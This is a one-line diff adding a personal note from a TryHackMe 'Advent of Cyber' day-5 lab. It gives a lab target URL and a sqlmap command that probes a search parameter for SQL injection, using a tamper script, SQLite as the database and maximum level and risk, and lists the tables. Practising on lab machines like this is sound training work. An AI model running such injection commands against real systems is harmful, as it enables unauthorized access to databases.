@@ -1,0 +1,1 @@
+http://10.10.126.181:8000/santapanel?search=* (GET)  # sqlmap.py -r /home/dyallo/Documents/Proyectos/try-hack-me/learn/25-days-of-security/day-5/req --tamper=space2comment --dbms=SQLite --tables --batch --level=5 --risk=3
